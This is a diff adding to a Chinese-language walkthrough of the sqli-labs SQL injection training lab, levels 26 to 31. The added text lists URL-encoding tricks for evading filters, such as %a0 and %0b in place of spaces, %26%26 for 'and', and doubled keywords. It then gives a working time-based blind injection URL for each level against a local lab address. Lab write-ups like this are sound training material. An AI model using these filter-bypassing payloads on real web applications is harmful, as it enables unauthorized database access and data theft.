@@ -200,9 +200,16 @@
     ```txt
     url编码对照：
     %23    #
+    %26    &
+    %a0    空格
+    %0b    TAB键（垂直）     可以代替空格
+    %09    TAB 键（水平）    可以代替空格
+    %0a    新建一行          可以代替空格
+    %0c    新的一页          可以代替空格
+    %0d    return 功能       可以代替空格
 
     等效替代：
-    and &&
+    and && %26%26
     or ||
 
     基本绕过滤：
@@ -214,6 +221,52 @@
 
 1. 注入语句如后 `http://192.168.3.148/Less-25a/?id=1 anandd sleep(5)`
 
+## 第二十六关
+
+这破关卡了我半天。用&&代替and我就没成功过，问题在哪？||代替or倒好像是可以  
+关于&&无法代替and的问题，可以试试`%26%26`,%26是&的url编码，试验成功。  
+**重点应该是在不能使注释的情况下闭合引号吧。**
+
+1. 最后注入成功的语句 `http://192.168.3.148/Less-26/?id=1%27anandd%a0sleep(5)%a0anandd%271`
+
+    > `http://192.168.3.148/Less-26/?id=1'and sleep(5) and'1`
+
+## 第二十六a关
+
+1. 多个括号的闭合 `http://192.168.3.148/Less-26a/?id=1%27)anandd%a0sleep(3)%a0anandd%a0(%271`
+
+    > `http://192.168.3.148/Less-26a/?id=1')and sleep(3) and ('1`
+
+## 第二十七关
+
+1. 注入语句 `http://192.168.3.148/Less-27/?id=1%27and%a0sleep(10)%a0and%271`
+
+    > `http://192.168.3.148/Less-27/?id=1'and sleep(10) and'1`
+
+## 第二十七a关
+
+1. 注入语句 `http://192.168.3.148/Less-27a/?id=1%22and%a0sleep(5)%a0and%221%22=%221`
+
+    > `http://192.168.3.148/Less-27a/?id=1"and sleep(5) and"1"="1`
+
+## 第二十八关
+
+1. 注入语句 `http://192.168.3.148/Less-28/?id=1%27%20)and%a0sleep(5)%a0and%a0(%271%27=%271`
+
+    > `http://192.168.3.148/Less-28/?id=1')and sleep(5) and ('1'='1`
+
+## 第二十九关
+
+1. 注入语句 `http://192.168.3.148/Less-29/?id=1' and sleep(5) and '1'='1`
+
+## 第三十关
+
+1. 注入语句 `http://192.168.3.148/Less-30/?id=1"and sleep(5) and "1"="1`
+
+## 第三十一关
+
+1. 注入语句 `http://192.168.3.148/Less-31/?id=1%") and sleep(5) and ("1"="1`
+
 ## 感谢以下博文的原作者
 
 > https://blog.csdn.net/sdb5858874/article/details/80727555  
@@ -221,4 +274,5 @@ https://blog.csdn.net/alex_seo/article/details/82148955
 https://blog.csdn.net/qq_34444097/article/details/83043678  
 https://blog.csdn.net/qq_28295425/article/details/78905978  
 https://blog.csdn.net/u012763794/article/details/51361152  
-https://www.cnblogs.com/AmoBlogs/p/8683218.html
+https://www.cnblogs.com/AmoBlogs/p/8683218.html  
+https://github.com/lcamry/sqli-labs/blob/master/mysql-injection.pdf
